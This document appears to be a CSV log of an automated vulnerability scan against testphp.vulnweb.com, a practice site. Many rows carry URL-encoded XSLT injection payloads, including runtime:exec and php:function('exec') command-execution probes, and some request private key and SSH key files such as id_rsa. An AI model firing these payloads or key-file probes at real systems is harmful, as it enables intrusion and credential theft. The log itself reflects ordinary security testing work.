ID,Req. Timestamp,Resp. Timestamp,Method,URL,Code,Reason,RTT,Size Resp. Header,Size Resp. Body
6639,Sun May 18 14:02:11 PKT 2025,Sun May 18 14:02:12 PKT 2025,GET,http://testphp.vulnweb.com/AJAX/infoartist.php?id=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,563,219,189
6640,Sun May 18 14:02:12 PKT 2025,Sun May 18 14:02:12 PKT 2025,GET,http://testphp.vulnweb.com/listproducts.php?cat=%3C,200,OK,278,222,2177
6641,Sun May 18 14:02:12 PKT 2025,Sun May 18 14:02:12 PKT 2025,GET,http://testphp.vulnweb.com/AJAX/infocateg.php?id=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,547,219,184
6642,Sun May 18 14:02:12 PKT 2025,Sun May 18 14:02:12 PKT 2025,GET,http://testphp.vulnweb.com/listproducts.php?artist=%3C,200,OK,557,222,2177
6643,Sun May 18 14:02:12 PKT 2025,Sun May 18 14:02:12 PKT 2025,GET,http://testphp.vulnweb.com/comment.php?pid=system-property%28%27xsl%3Avendor%27%29%2F%3E,404,Not Found,541,227,16
6644,Sun May 18 14:02:12 PKT 2025,Sun May 18 14:02:12 PKT 2025,GET,http://testphp.vulnweb.com/privatekey.key,404,Not Found,563,155,153
6645,Sun May 18 14:02:12 PKT 2025,Sun May 18 14:02:12 PKT 2025,GET,http://testphp.vulnweb.com/artists.php?artist=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,543,222,2240
6646,Sun May 18 14:02:12 PKT 2025,Sun May 18 14:02:13 PKT 2025,GET,http://testphp.vulnweb.com/AJAX/infoartist.php?id=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,560,219,212
6647,Sun May 18 14:02:12 PKT 2025,Sun May 18 14:02:13 PKT 2025,GET,http://testphp.vulnweb.com/myserver.key,404,Not Found,284,155,153
6648,Sun May 18 14:02:12 PKT 2025,Sun May 18 14:02:13 PKT 2025,GET,http://testphp.vulnweb.com/listproducts.php?cat=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,570,222,2230
6649,Sun May 18 14:02:12 PKT 2025,Sun May 18 14:02:13 PKT 2025,GET,http://testphp.vulnweb.com/AJAX/infocateg.php?id=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,544,219,189
6651,Sun May 18 14:02:12 PKT 2025,Sun May 18 14:02:13 PKT 2025,GET,http://testphp.vulnweb.com/comment.php?pid=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,404,Not Found,528,227,16
6650,Sun May 18 14:02:12 PKT 2025,Sun May 18 14:02:13 PKT 2025,GET,http://testphp.vulnweb.com/listproducts.php?artist=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,549,222,2230
6652,Sun May 18 14:02:12 PKT 2025,Sun May 18 14:02:13 PKT 2025,GET,http://testphp.vulnweb.com/product.php?pic=%3C,200,OK,555,222,2534
6653,Sun May 18 14:02:13 PKT 2025,Sun May 18 14:02:13 PKT 2025,GET,http://testphp.vulnweb.com/key.pem,404,Not Found,293,155,153
6654,Sun May 18 14:02:12 PKT 2025,Sun May 18 14:02:13 PKT 2025,GET,http://testphp.vulnweb.com/artists.php?artist=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,566,222,2245
6655,Sun May 18 14:02:13 PKT 2025,Sun May 18 14:02:13 PKT 2025,GET,http://testphp.vulnweb.com/AJAX/infoartist.php?id=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftestphp.vulnweb.com%3A22%27%29%22%2F%3E,200,OK,536,219,220
6656,Sun May 18 14:02:13 PKT 2025,Sun May 18 14:02:13 PKT 2025,GET,http://testphp.vulnweb.com/id_rsa,404,Not Found,295,155,153
6657,Sun May 18 14:02:13 PKT 2025,Sun May 18 14:02:13 PKT 2025,GET,http://testphp.vulnweb.com/AJAX/infocateg.php?id=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,542,219,212
6658,Sun May 18 14:02:13 PKT 2025,Sun May 18 14:02:13 PKT 2025,GET,http://testphp.vulnweb.com/listproducts.php?cat=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,571,222,2206
6659,Sun May 18 14:02:13 PKT 2025,Sun May 18 14:02:13 PKT 2025,GET,http://testphp.vulnweb.com/comment.php?pid=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,404,Not Found,539,227,16
6660,Sun May 18 14:02:13 PKT 2025,Sun May 18 14:02:13 PKT 2025,GET,http://testphp.vulnweb.com/listproducts.php?artist=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,542,222,2206
6661,Sun May 18 14:02:13 PKT 2025,Sun May 18 14:02:13 PKT 2025,GET,http://testphp.vulnweb.com/product.php?pic=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,569,222,2587
6662,Sun May 18 14:02:13 PKT 2025,Sun May 18 14:02:13 PKT 2025,GET,http://testphp.vulnweb.com/id_dsa,404,Not Found,297,155,153
6663,Sun May 18 14:02:13 PKT 2025,Sun May 18 14:02:14 PKT 2025,GET,http://testphp.vulnweb.com/artists.php?artist=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,558,222,2268
6664,Sun May 18 14:02:13 PKT 2025,Sun May 18 14:02:14 PKT 2025,GET,http://testphp.vulnweb.com/AJAX/infoartist.php?id=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,565,219,233
6665,Sun May 18 14:02:13 PKT 2025,Sun May 18 14:02:14 PKT 2025,GET,http://testphp.vulnweb.com/AJAX/infocateg.php?id=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftestphp.vulnweb.com%3A22%27%29%22%2F%3E,200,OK,527,219,220
6666,Sun May 18 14:02:13 PKT 2025,Sun May 18 14:02:14 PKT 2025,GET,http://testphp.vulnweb.com/listproducts.php?cat=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,542,222,2211
6667,Sun May 18 14:02:13 PKT 2025,Sun May 18 14:02:14 PKT 2025,GET,http://testphp.vulnweb.com/.ssh/id_rsa,404,Not Found,281,155,153
6668,Sun May 18 14:02:13 PKT 2025,Sun May 18 14:02:14 PKT 2025,GET,http://testphp.vulnweb.com/listproducts.php?artist=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,554,222,2211
6669,Sun May 18 14:02:13 PKT 2025,Sun May 18 14:02:14 PKT 2025,GET,http://testphp.vulnweb.com/comment.php?pid=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftestphp.vulnweb.com%3A22%27%29%22%2F%3E,404,Not Found,574,227,16
6670,Sun May 18 14:02:13 PKT 2025,Sun May 18 14:02:14 PKT 2025,GET,http://testphp.vulnweb.com/product.php?pic=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,574,222,2563
6671,Sun May 18 14:02:14 PKT 2025,Sun May 18 14:02:14 PKT 2025,GET,http://testphp.vulnweb.com/.ssh/id_dsa,404,Not Found,281,155,153
6672,Sun May 18 14:02:14 PKT 2025,Sun May 18 14:02:14 PKT 2025,GET,http://testphp.vulnweb.com/artists.php?artist=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftestphp.vulnweb.com%3A22%27%29%22%2F%3E,200,OK,544,222,2276
6673,Sun May 18 14:02:14 PKT 2025,Sun May 18 14:02:14 PKT 2025,GET,http://testphp.vulnweb.com/AJAX/infoartist.php?id=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,550,219,228
6674,Sun May 18 14:02:14 PKT 2025,Sun May 18 14:02:14 PKT 2025,GET,http://testphp.vulnweb.com/AJAX/infocateg.php?id=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,538,219,233
6675,Sun May 18 14:02:14 PKT 2025,Sun May 18 14:02:14 PKT 2025,GET,http://testphp.vulnweb.com/listproducts.php?cat=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,554,222,2234
6676,Sun May 18 14:02:14 PKT 2025,Sun May 18 14:02:14 PKT 2025,GET,http://testphp.vulnweb.com/adminer.php,404,Not Found,288,227,16
6677,Sun May 18 14:02:14 PKT 2025,Sun May 18 14:02:14 PKT 2025,GET,http://testphp.vulnweb.com/comment.php?pid=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,404,Not Found,525,227,16
6678,Sun May 18 14:02:14 PKT 2025,Sun May 18 14:02:14 PKT 2025,GET,http://testphp.vulnweb.com/listproducts.php?artist=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,557,222,2234
6679,Sun May 18 14:02:14 PKT 2025,Sun May 18 14:02:14 PKT 2025,GET,http://testphp.vulnweb.com/product.php?pic=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,559,222,2568
6680,Sun May 18 14:02:14 PKT 2025,Sun May 18 14:02:15 PKT 2025,GET,http://testphp.vulnweb.com/artists.php?artist=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,563,222,2289
6681,Sun May 18 14:02:14 PKT 2025,Sun May 18 14:02:15 PKT 2025,GET,http://testphp.vulnweb.com/AJAX/infocateg.php?id=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,546,219,228
6682,Sun May 18 14:02:14 PKT 2025,Sun May 18 14:02:15 PKT 2025,GET,http://testphp.vulnweb.com/listproducts.php?cat=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftestphp.vulnweb.com%3A22%27%29%22%2F%3E,200,OK,558,222,2242
6683,Sun May 18 14:02:14 PKT 2025,Sun May 18 14:02:15 PKT 2025,GET,http://testphp.vulnweb.com/showimage.php?file=%3C,200,OK,547,207,221
6684,Sun May 18 14:02:14 PKT 2025,Sun May 18 14:02:15 PKT 2025,GET,http://testphp.vulnweb.com/comment.php?pid=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,404,Not Found,573,227,16
6685,Sun May 18 14:02:14 PKT 2025,Sun May 18 14:02:15 PKT 2025,GET,http://testphp.vulnweb.com/vb_test.php,404,Not Found,568,227,16
6686,Sun May 18 14:02:14 PKT 2025,Sun May 18 14:02:15 PKT 2025,GET,http://testphp.vulnweb.com/listproducts.php?artist=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftestphp.vulnweb.com%3A22%27%29%22%2F%3E,200,OK,566,222,2242
6687,Sun May 18 14:02:14 PKT 2025,Sun May 18 14:02:15 PKT 2025,GET,http://testphp.vulnweb.com/product.php?pic=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,573,222,2591
6688,Sun May 18 14:02:15 PKT 2025,Sun May 18 14:02:15 PKT 2025,GET,http://testphp.vulnweb.com/artists.php?artist=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,546,222,2284
6689,Sun May 18 14:02:15 PKT 2025,Sun May 18 14:02:15 PKT 2025,GET,http://testphp.vulnweb.com/listproducts.php?cat=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,545,222,2255
6690,Sun May 18 14:02:15 PKT 2025,Sun May 18 14:02:15 PKT 2025,GET,http://testphp.vulnweb.com/CHANGELOG.txt,404,Not Found,534,155,153
6691,Sun May 18 14:02:15 PKT 2025,Sun May 18 14:02:15 PKT 2025,GET,http://testphp.vulnweb.com/listproducts.php?artist=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,562,222,2255
6692,Sun May 18 14:02:15 PKT 2025,Sun May 18 14:02:15 PKT 2025,GET,http://testphp.vulnweb.com/showimage.php?file=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,574,207,274
6693,Sun May 18 14:02:15 PKT 2025,Sun May 18 14:02:16 PKT 2025,GET,http://testphp.vulnweb.com/showimage.php?file=%3C&size=160,200,OK,545,207,221
6694,Sun May 18 14:02:15 PKT 2025,Sun May 18 14:02:16 PKT 2025,GET,http://testphp.vulnweb.com/product.php?pic=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftestphp.vulnweb.com%3A22%27%29%22%2F%3E,200,OK,567,222,2599
6695,Sun May 18 14:02:15 PKT 2025,Sun May 18 14:02:16 PKT 2025,GET,http://testphp.vulnweb.com/sites/default/files/.ht.sqlite,404,Not Found,265,155,153
6696,Sun May 18 14:02:15 PKT 2025,Sun May 18 14:02:16 PKT 2025,GET,http://testphp.vulnweb.com/listproducts.php?cat=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,566,222,2250
6697,Sun May 18 14:02:16 PKT 2025,Sun May 18 14:02:16 PKT 2025,GET,http://testphp.vulnweb.com/composer.json,404,Not Found,286,155,153
6698,Sun May 18 14:02:15 PKT 2025,Sun May 18 14:02:16 PKT 2025,GET,http://testphp.vulnweb.com/showimage.php?file=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,551,207,251
6699,Sun May 18 14:02:15 PKT 2025,Sun May 18 14:02:16 PKT 2025,GET,http://testphp.vulnweb.com/listproducts.php?artist=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,566,222,2250
6700,Sun May 18 14:02:16 PKT 2025,Sun May 18 14:02:16 PKT 2025,GET,http://testphp.vulnweb.com/showimage.php?file=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&size=160,200,OK,577,207,274
6701,Sun May 18 14:02:16 PKT 2025,Sun May 18 14:02:16 PKT 2025,GET,http://testphp.vulnweb.com/product.php?pic=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,200,OK,557,222,2612
6702,Sun May 18 14:02:16 PKT 2025,Sun May 18 14:02:16 PKT 2025,GET,http://testphp.vulnweb.com/composer.lock,404,Not Found,265,155,153
6703,Sun May 18 14:02:16 PKT 2025,Sun May 18 14:02:17 PKT 2025,GET,http://testphp.vulnweb.com/vim_settings.xml,404,Not Found,268,155,153
6704,Sun May 18 14:02:16 PKT 2025,Sun May 18 14:02:17 PKT 2025,GET,http://testphp.vulnweb.com/showimage.php?file=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,556,207,281
6705,Sun May 18 14:02:16 PKT 2025,Sun May 18 14:02:17 PKT 2025,GET,http://testphp.vulnweb.com/product.php?pic=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,200,OK,550,222,2607
6706,Sun May 18 14:02:16 PKT 2025,Sun May 18 14:02:17 PKT 2025,GET,http://testphp.vulnweb.com/showimage.php?file=system-property%28%27xsl%3Avendor%27%29%2F%3E&size=160,200,OK,563,207,251
6707,Sun May 18 14:02:17 PKT 2025,Sun May 18 14:02:17 PKT 2025,GET,http://testphp.vulnweb.com/server-info,404,Not Found,266,155,153
6708,Sun May 18 14:02:17 PKT 2025,Sun May 18 14:02:17 PKT 2025,GET,http://testphp.vulnweb.com/phpinfo.php,404,Not Found,273,227,16
6709,Sun May 18 14:02:17 PKT 2025,Sun May 18 14:02:17 PKT 2025,GET,http://testphp.vulnweb.com/showimage.php?file=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,565,207,278
6710,Sun May 18 14:02:17 PKT 2025,Sun May 18 14:02:17 PKT 2025,GET,http://testphp.vulnweb.com/showimage.php?file=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&size=160,200,OK,538,207,281
6711,Sun May 18 14:02:17 PKT 2025,Sun May 18 14:02:18 PKT 2025,GET,http://testphp.vulnweb.com/info.php,404,Not Found,567,227,16
6712,Sun May 18 14:02:17 PKT 2025,Sun May 18 14:02:18 PKT 2025,GET,http://testphp.vulnweb.com/showimage.php?file=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftestphp.vulnweb.com%3A22%27%29%22%2F%3E,200,OK,565,207,286
6714,Sun May 18 14:02:17 PKT 2025,Sun May 18 14:02:18 PKT 2025,GET,http://testphp.vulnweb.com/showimage.php?file=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&size=160,200,OK,544,207,278
6715,Sun May 18 14:02:18 PKT 2025,Sun May 18 14:02:18 PKT 2025,GET,http://testphp.vulnweb.com/i.php,404,Not Found,544,227,16
6716,Sun May 18 14:02:18 PKT 2025,Sun May 18 14:02:18 PKT 2025,GET,http://testphp.vulnweb.com/showimage.php?file=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftestphp.vulnweb.com%3A22%27%29%22%2F%3E&size=160,200,OK,551,207,286
6718,Sun May 18 14:02:18 PKT 2025,Sun May 18 14:02:19 PKT 2025,GET,http://testphp.vulnweb.com/test.php,404,Not Found,574,227,16
6719,Sun May 18 14:02:18 PKT 2025,Sun May 18 14:02:19 PKT 2025,GET,http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F7.jpg&size=%3C,200,OK,804,209,19219
6720,Sun May 18 14:02:19 PKT 2025,Sun May 18 14:02:19 PKT 2025,GET,http://testphp.vulnweb.com/_wpeprivate/config.json,404,Not Found,557,155,153
6721,Sun May 18 14:02:19 PKT 2025,Sun May 18 14:02:20 PKT 2025,GET,http://testphp.vulnweb.com/_framework/blazor.boot.json,404,Not Found,281,155,153
6722,Sun May 18 14:02:20 PKT 2025,Sun May 18 14:02:20 PKT 2025,GET,http://testphp.vulnweb.com/.hg,404,Not Found,282,155,153
6723,Sun May 18 14:02:19 PKT 2025,Sun May 18 14:02:20 PKT 2025,GET,http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F7.jpg&size=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,200,OK,816,209,19219
6724,Sun May 18 14:02:20 PKT 2025,Sun May 18 14:02:20 PKT 2025,GET,http://testphp.vulnweb.com/.bzr,404,Not Found,281,155,153
6725,Sun May 18 14:02:20 PKT 2025,Sun May 18 14:02:20 PKT 2025,GET,http://testphp.vulnweb.com/._darcs,404,Not Found,286,155,153
6726,Sun May 18 14:02:20 PKT 2025,Sun May 18 14:02:21 PKT 2025,GET,http://testphp.vulnweb.com/BitKeeper,404,Not Found,277,155,153
6727,Sun May 18 14:02:20 PKT 2025,Sun May 18 14:02:21 PKT 2025,GET,http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F7.jpg&size=system-property%28%27xsl%3Avendor%27%29%2F%3E,200,OK,880,209,19219
6728,Sun May 18 14:02:21 PKT 2025,Sun May 18 14:02:21 PKT 2025,GET,http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F7.jpg&size=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,547,209,19219
6729,Sun May 18 14:02:21 PKT 2025,Sun May 18 14:02:22 PKT 2025,GET,http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F7.jpg&size=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,200,OK,853,209,19219
6730,Sun May 18 14:02:22 PKT 2025,Sun May 18 14:02:23 PKT 2025,GET,http://testphp.vulnweb.com/showimage.php?file=.%2Fpictures%2F7.jpg&size=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Ftestphp.vulnweb.com%3A22%27%29%22%2F%3E,200,OK,819,209,19219
6731,Sun May 18 14:02:23 PKT 2025,Sun May 18 14:02:24 PKT 2025,GET,http://testphp.vulnweb.com,200,OK,546,222,4958
6732,Sun May 18 14:02:23 PKT 2025,Sun May 18 14:02:24 PKT 2025,GET,http://testphp.vulnweb.com/sendcommand.php?cart_id=033ec88d9c222013b8526534dfca6888&submitForm=place%20a%20command%20for%20these%20items,200,OK,546,221,533
6733,Sun May 18 14:02:23 PKT 2025,Sun May 18 14:02:24 PKT 2025,GET,http://testphp.vulnweb.com/guestbook.php?name=test&submit=add%20message&text=good,200,OK,547,222,5454
6734,Sun May 18 14:02:23 PKT 2025,Sun May 18 14:02:24 PKT 2025,GET,http://testphp.vulnweb.com/cart.php?addcart=7&price=15000,200,OK,551,222,5200
6735,Sun May 18 14:02:23 PKT 2025,Sun May 18 14:02:24 PKT 2025,GET,http://testphp.vulnweb.com/AJAX/infotitle.php?id=7,200,OK,555,219,153
6737,Sun May 18 14:02:23 PKT 2025,Sun May 18 14:02:24 PKT 2025,GET,http://testphp.vulnweb.com/userinfo.php?uaddress=hh&ucc=4ns6yfgjk6sg6914lk0oc81et5zzn0bs3gv3mrb&uemail=czzq%2540gmail.com&update=update&uphone=2323345&urname=123431,200,OK,570,222,6068
6740,Sun May 18 14:02:23 PKT 2025,Sun May 18 14:02:24 PKT 2025,GET,http://testphp.vulnweb.com/userinfo.php?pass=test&uname=test,200,OK,570,222,5523
6741,Sun May 18 14:02:24 PKT 2025,Sun May 18 14:02:24 PKT 2025,GET,http://testphp.vulnweb.com/AJAX,301,Moved Permanently,574,207,169
6743,Sun May 18 14:02:24 PKT 2025,Sun May 18 14:02:25 PKT 2025,GET,http://testphp.vulnweb.com/images,301,Moved Permanently,281,209,169
6744,Sun May 18 14:02:25 PKT 2025,Sun May 18 14:02:25 PKT 2025,POST,http://testphp.vulnweb.com/AJAX/infotitle.php,200,OK,282,219,194
6746,Sun May 18 14:02:25 PKT 2025,Sun May 18 14:02:25 PKT 2025,POST,http://testphp.vulnweb.com/AJAX/showxml.php,200,OK,529,221,179
6747,Sun May 18 14:02:25 PKT 2025,Sun May 18 14:02:25 PKT 2025,POST,http://testphp.vulnweb.com/userinfo.php,200,OK,530,253,5945
6749,Sun May 18 14:02:25 PKT 2025,Sun May 18 14:02:25 PKT 2025,POST,http://testphp.vulnweb.com/userinfo.php,200,OK,536,222,6007
6750,Sun May 18 14:02:25 PKT 2025,Sun May 18 14:02:25 PKT 2025,POST,http://testphp.vulnweb.com/sendcommand.php,200,OK,573,221,543
6751,Sun May 18 14:02:25 PKT 2025,Sun May 18 14:02:25 PKT 2025,GET,http://testphp.vulnweb.com,200,OK,563,222,4958
6752,Sun May 18 14:02:25 PKT 2025,Sun May 18 14:02:25 PKT 2025,POST,http://testphp.vulnweb.com/cart.php,200,OK,555,222,5622
6753,Sun May 18 14:02:25 PKT 2025,Sun May 18 14:02:25 PKT 2025,POST,http://testphp.vulnweb.com/guestbook.php,200,OK,548,222,5462
6756,Sun May 18 14:02:25 PKT 2025,Sun May 18 14:02:26 PKT 2025,POST,http://testphp.vulnweb.com/AJAX/infotitle.php,200,OK,572,219,194
6758,Sun May 18 14:02:25 PKT 2025,Sun May 18 14:02:26 PKT 2025,POST,http://testphp.vulnweb.com/userinfo.php,200,OK,545,253,5951
6760,Sun May 18 14:02:25 PKT 2025,Sun May 18 14:02:26 PKT 2025,POST,http://testphp.vulnweb.com/AJAX/showxml.php,200,OK,562,221,179
6761,Sun May 18 14:02:25 PKT 2025,Sun May 18 14:02:26 PKT 2025,POST,http://testphp.vulnweb.com/sendcommand.php,200,OK,572,221,543
6762,Sun May 18 14:02:25 PKT 2025,Sun May 18 14:02:26 PKT 2025,POST,http://testphp.vulnweb.com/guestbook.php,200,OK,576,222,5462
